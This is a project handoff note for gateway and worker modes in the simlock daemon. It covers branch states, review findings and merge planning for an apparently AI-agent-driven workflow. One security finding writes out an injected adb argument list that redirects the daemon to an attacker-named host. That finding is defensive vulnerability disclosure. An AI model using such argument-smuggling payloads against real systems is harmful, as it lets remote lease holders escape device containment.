# HANDOFF — ADR 0005 (gateway and worker modes)

Written 2026-09-06 when the session was stopped mid-flight. Everything
described here is committed and pushed. Nothing is in a working tree you
cannot reach.

## What this work is

ADR 0005 makes a simlock daemon run in one of two modes: a **worker** owns
devices as today, a **gateway** owns none and fronts a fleet of workers. It is
Accepted, so **the docs are the specification** — `AGENTS.md` forbids editing
them back to match current behaviour. It lands as four issues, each its own PR,
each stacked on the previous one:

| Issue | What | PR | State |
|---|---|---|---|
| #116 | `device.exec` — run simctl/adb on the worker, stream output back | [#128](https://github.com/callstackincubator/simlock/pull/128) | 3 review rounds done, round-3 fixes **unverified on a WIP branch** |
| #117 | Gateway skeleton — `config.mode`, uplink, worker views, `worker.*`, aggregated status | [#129](https://github.com/callstackincubator/simlock/pull/129) | 1 review round done, **findings not yet applied** |
| #118 | Fleet queue, routing, lease + exec forwarding, fleet-wide one-lease rule | — | Not started |
| #119 | Drain, `WORKER_UNREACHABLE`, reconnect rebuild, e2e | — | Not started |

ADR 0004 (TTL-first leases) is finished and sits underneath all of it.

## Branch heads, exactly as pushed

```
claude/simlock-host-worker-prd-ohc30e   2390ede   PR #121  ADR 0004 + 0005 records
claude/adr-0004-c-docs                  c8ff5b4   PR #122  ADR 0004 docs
claude/adr-0004-a-client-renew          c81c644   PR #124  client renew timers
claude/adr-0004-b-daemon-ttl-only       7564ea3   PR #125  daemon TTL-only, protocol 4
claude/adr-0005-120-docs                3aa889d   PR #127  ADR 0005 docs
claude/adr-0005-116-device-exec         4e6fe22   PR #128  device.exec
claude/adr-0005-116-exec-round3-wip     96a41bc   (no PR)  UNVERIFIED round-3 fixes
claude/adr-0005-117-gateway-skeleton    7470820   PR #129  gateway skeleton
```

## Start here tomorrow

### 1. Verify or redo the `claude/adr-0005-116-exec-round3-wip` snapshot

This is the only piece of work that is **not** in a reviewed state. An agent
was part-way through fixing PR #128's third-round findings when the session
stopped; its 15 modified files were committed verbatim to that branch so they
would not be lost.

**It is green but unreviewed.** A full `pnpm check` was run on `96a41bc`
*after* the snapshot was taken and passed end to end (exit 0): typecheck, e2e
typecheck, lint, format, **1480 unit tests** passing / 2 skipped — seven more
than the 1473 baseline, so the new tests are real — and 53 e2e passing, 1
expected fail, 9 skipped. What it has **not** had is the agent's own finishing
pass or any review round. Treat every hunk as a draft that compiles and passes,
not as a landed fix.

Do this: check out the branch, read the diff against `4e6fe22` critically —
especially the F1 parser rewrite, where "green" proves much less than usual
because the *old* tests passed against the vulnerable parser too — then
fast-forward `claude/adr-0005-116-device-exec` onto it (or cherry-pick, or redo
it — your call once you have read it), and run a fourth isolated review. Do
**not** assume it is correct because it is committed and green.

The six findings it is meant to close, from the third isolated review of #128:

**F1 — CONFIRMED containment escape, the important one.**
`callerSuppliedScopeFlag` in `src/drivers/android/index.ts` walks adb's global
arguments and skips a flag's *value* only when the flag is on a hardcoded list
(`-s -t -L -H -P --server-port`). `--reply-fd` is a real adb global that takes
a value and is **not** on that list, so the scanner treats its value `9` as a
bare word, concludes the subcommand has started, stops scanning, and misses a
caller-supplied `-H`/`-P` that follows. Real adb keeps parsing globals and
honours them — and takes the *last* `-P`/`-H` on the line, so the caller's
beats the one simlock inserts.

Verified against real adb (1.0.41 / 37.0.1) on this machine:

```
$ adb -P 5038 --reply-fd 9 -H 127.0.0.1 -P 1 devices   # what the driver builds
adb: failed to check server version: cannot connect to daemon at tcp:127.0.0.1:1
```

So `POST /v1/leases/{id}/exec` with
`args: ["--reply-fd","9","-H","attacker.example","-P","5037","shell","id"]`
makes the daemon connect to an attacker-named host:port instead of simlock's
own adb server. That is the hole safety rule 9 exists to close, and
`device.exec` turns it from "reachable by someone already on the box" into
"reachable by any remote lease holder".

Fix by **failing closed**, per the safety rule: enumerate the globals you
accept with their arity and refuse any unrecognized `-`-prefixed argument in
the globals region. A blocklist is the wrong shape — the next adb release adds
a global and the hole reopens. Keep `-s`/`-t`/`-d`/`-e` allowed (they select a
device *inside* containment), and keep these spellings passing through past the
subcommand (`adb shell echo -Please` echoes a word).

Note the test that let this through: `src/drivers/android/index.test.ts:1803`
is titled *"in every spelling adb accepts"* but only varies the spelling of the
flag itself, never a preceding global whose value ends the scan. The title
claims something the test does not check. Rewrite it so it does.

`docs/CLI.md` and `docs/known-pitfalls.md` both currently promise the stronger
guarantee. Make them describe what the code really does.

**F2 — CONFIRMED silent output truncation.** In
`src/ports/process-runner.ts`, `#forward` pauses the readable while the
consumer's delivery promise is outstanding. A paused readable never reaches
`close`. So the exit grace path decides: after `EXIT_TO_CLOSE_GRACE_MS` (1s)
with an unchanged chunk count it settles `wait()` while bytes are still in the
paused pipe. The dispatcher returns `{ exitCode }`, the route writes its
terminal `exit` event, and the rest is dropped **with no marker at all**. The
client sees `exit {"exitCode":0}` with the tail missing.
`EXIT_TO_CLOSE_MAX_DEFERRAL_MS` (5s) truncates the same way.

The distinction to draw: *"the pipe is idle because the child is gone"* versus
*"idle because **we** paused it"*. The second is our own state, not an
inference — so the quiet window must not run while a delivery is outstanding.
If a bound must still exist, make it fail visibly rather than short-read.

Why it survived two rounds: the HTTP backpressure test in `src/http/app.test.ts`
stalls the stream while the process is still running, never across its exit.

**F3** — `mode: "gateway"` is accepted by config and branched on by the CLI but
implemented nowhere on #128. `docs/CONFIGURATION.md` calls it "inert", which is
false — it flips `simlock simctl`/`simlock adb` onto `device.exec`. Fix the
doc, not the config: **do not reject `"gateway"` at load**, #117 lands on top
and implements it.

**F4** — `src/http/dispatcher-session.ts:52` declares `onOutput` returning
`void` while `DispatchSession.onOutput` is `void | Promise<void>` and the route
really does return the write promise. Runtime is right; the type says the
opposite of the load-bearing invariant.

**F5** — `src/http/output-relay.ts:44-49`: while buffering, `push` returns
`undefined`, so the runner never pauses. The comment claims the window is "one
turn of the event loop", but `relay.attach` runs inside hono's `streamSSE`
callback, which is not guaranteed to be the next turn.

**F6** — `src/cli/index.ts:459-466` `readPipedStdin` reads to EOF for any
non-TTY stdin, so a CI job with an inherited never-closed pipe hangs before the
command is sent. ADR §19c does prescribe read-to-EOF, so this is
spec-conformant; decide deliberately (fix, or write it up as a known pitfall).

Everything else on #128 was checked and found clean — authorization across
every role/`requesterId`/ownership combination on both transports, the iOS
`--set`/`--profiles` scan, the timeout/exit race and SIGTERM→SIGKILL via the
process group, the protocol range `{5,5}`, the error table. Don't churn them.

### 2. Apply the first review round to PR #129

`pnpm check` was green on `7470820` (1622 unit, 56 e2e) and Fallow was clean,
but the findings below are **not applied**. The review agent was stopped before
it could act on them.

**D1 — CONFIRMED. A stale uplink's close marks the *live* worker
`disconnected`, permanently.** `GatewayService.#accept`
(`src/gateway/service.ts:127-148`) carefully guards the `#links` map against a
replaced link's late close. But `WorkerLink.#handleClosed()`
(`src/gateway/worker-link.ts:227-231`) calls
`registry.disconnected(this.workerId)` with **no such guard**, and the registry
is keyed by worker id, not by link — so a dead link's close mutates its
successor's view.

Sequence: worker's TCP path dies silently (NAT rebind, sleep, partition); the
gateway's socket is half-open and fires no `close`; the worker's own end *did*
see it, backs off and redials; the new link connects, `registry.connected(...)`
runs and the fleet looks correct; minutes later the OS finally reports the old
socket dead and the *currently connected* worker flips to `disconnected`.

It never recovers: `WorkerRegistry.refresh()` only replaces worker-reported
fields and never touches `connection`. Under #118 that worker then gets no
dispatches and `aggregateStatus` drops its capacity from the fleet sum. A
milder variant fires on every clean re-dial: `previous.close()` (1 RTT) usually
beats `link.start()` (2 RTTs), producing a spurious
`worker.disconnected` → `worker.connected` pair on the bus.

**Deleting `service.ts:127-133` outright leaves the entire suite green.** No
test joins the same worker id twice against a live service; the e2e never
reconnects. Fix the guard *and* close that test gap.

**D2 — CONFIRMED.** `WorkerLink.close()` (`worker-link.ts:213-225`) awaits
`unsubscribe?.()` — a real `events.unsubscribe` RPC — before closing the
socket. `SimlockWire.call` rejects immediately only once `#dead` is set, and
**the client has no per-call timeout anywhere**. On a half-open socket that
promise never settles, so `close()` never reaches `connection.close()` and the
WebSocket leaks for the life of the process. This is what widens D1's window
from microseconds to minutes. The `.catch(() => undefined)` reads as
best-effort, but a hang is not an error.

**D3 — CONFIRMED.** `refresh()` (`worker-link.ts:163-188`) sets
`#refreshing = true` and clears it only in a `finally` on that same
timeout-free wire. One hung round trip latches it forever: every later tick
early-returns, and the view freezes at its last contents **while still
reporting `connected`**. There is also no WebSocket ping/pong on either half,
so ADR §6's "the uplink is the reachability signal" holds only as fast as TCP
retransmission timeout — order of minutes, bounded by nothing in our code.

**D4** — `docs/CONFIGURATION.md:61-65` still says gateway mode is inert and
names *this PR's own issue* as future work, forty lines above the correct new
section the same diff adds. Note this collides with F3 above: #128 rewrites
that paragraph to describe worker-only reality, #129 should replace it
outright. Consistent intent, textual conflict at the rebase.

**D5 — spec divergence, needs a human decision.** ADR §3 says `gateway.url`
"should be `wss://`, or plain `ws://`/`http://` only over loopback or inside
the operator's own tunnel". `src/core/config.ts:394-397` accepts only
`ws:`/`wss:` and fails the start otherwise — and `src/core/config.test.ts`
*pins* the divergence with an explicit case, while `docs/CONFIGURATION.md` was
rewritten to match the code. That is exactly what `AGENTS.md` forbids. Either
accept `http:`/`https:` (`resolveUplinkUrl` already resolves against them; only
the ws client needs the scheme swap) or amend the ADR. **Ask before picking.**

Minor: **M1** `#forget()` deletes a view but never clears `#drained` or
re-saves the store, so a removed worker's drain flag survives in `workers.json`
forever and silently re-drains the machine when it returns, with `undrain`
throwing `UNKNOWN_WORKER` in the meantime — a one-way trapdoor plus an
unbounded file. **M2** retention holds a view for *any* lease, but ADR §6/§14
scope it to *gateway-issued* leases (that is what the `gw:<instance id>:`
requester prefix is for); a no-op today, lands on #118 with nothing pointing at
it. **M3** `worker.rejected` always passes `undefined` for the fields
`docs/EVENTS.md` advertises. **M4** the `src/gateway/` boundary test uses a
non-recursive `readdirSync` and matches only `from "…"`, so a future
subdirectory or a dynamic `await import()` slips past — it does catch today's
violations, this is hardening.

The review confirmed clean: containment (the mode branch precedes registry
load, driver discovery and root validation; an engine access in gateway mode is
a *compile* error), authorization on `/v1` and on the uplink upgrade, the
`status.get` shape, `list.get`'s widened union arm ordering, and the protocol
range — #117 correctly does not move it.

### 3. Then #118, then #119

Neither is started. Both build directly on #129, so starting either before
#129 settles just buys rebases. Scope is in `gh issue view 118` / `119`.

## The merge train, and a decision worth taking early

All five finished PRs are `MERGEABLE`/`CLEAN` with green Quality, Fallow and
CodeQL. But the stack is **forked**, not linear:

```
main
 └── #121 ─┬── #122 ── #127                       (docs line)
           └── #124 ── #125 ── #128 ── #129 …     (code line)
```

The two lines diverge at #121 and collide: a trial merge of #127 against #128
shows **27 conflict regions**, mostly because the code line carries hand-made
`docs: sync … from #122` commits that duplicate what the docs line lands for
real.

The planned merge order was
#121 → #122 → #124 → #125 → #127 → #128 → #129 → #118 → #119, which resolves
that conflict inside the merge queue. **Landing the docs line first
(#121 → #122 → #127) and then rebasing the whole code line onto main once**
turns it into a single deliberate rebase instead. Worth putting to the user
before the first merge.

Use `gh stack` for restacking, not `gh pr edit --base` / `gh pr merge`.

## How this work has been run

The user's instruction: act as chief of staff, delegate implementation to a
**Sonnet-class** subagent, and have implementation spawn an **Opus-class**
subagent for adversarial review. The reviewer sees **only** the issue, the ADR,
the binding rules and the diff — never the PR description, which is the
implementer's own account and anchors the reviewer to its framing. Every round
uses a **fresh** reviewer; reusing one anchors it on its own prior findings.

That pattern has paid for itself. Round three of #128 found a verified
containment escape that two prior rounds missed; round one of #129 found a
reconnect bug with zero test coverage. In both cases the tell was the same: **a
test whose title claims more than its body checks.** Worth looking for
deliberately.

## Traps that cost time

- **`SendMessage` is disabled in this session.** You cannot steer or resume a
  running agent. Every brief must be complete and self-contained up front, and
  an agent that returns early takes its children's unread results with it —
  that happened twice here and lost a whole review round. Consider spawning
  reviewers with `run_in_background: false` so the parent blocks on the result.
- **Agent worktrees hold branches.** A finished agent's worktree keeps its
  branch checked out and blocks the next agent from claiming it. `git worktree
  list | grep agent-` and prune the unlocked ones; `locked` means still alive.
- **Stopping an agent loses uncommitted work.** Check
  `git -C <worktree> status` before stopping one. That is why
  `claude/adr-0005-116-exec-round3-wip` exists.
- **The pre-commit `format` hook fails on every docs-only commit** — issue
  #126, still open. Use `--no-verify` and say so in the commit body.
- **The fake-driver e2e suite flakes under CPU contention** in files unrelated
  to whatever you changed. Every flake so far passed when run alone. Re-run the
  single file before believing it.
- **Never use bare `git stash`** — the stash stack is shared across worktrees
  and other sessions pop it. Use a WIP commit.
- **Do not widen the protocol range** to paper over a break; ADR 0003 §6 says a
  break lands with no compatibility path kept.

## Small loose end

`docs/agent-rules/events.md` rule 6 should inline its ADR 0004 exception.
Small enough to do alongside the one-line status flips of ADR 0004 and 0005 to
`Accepted` once everything has landed.
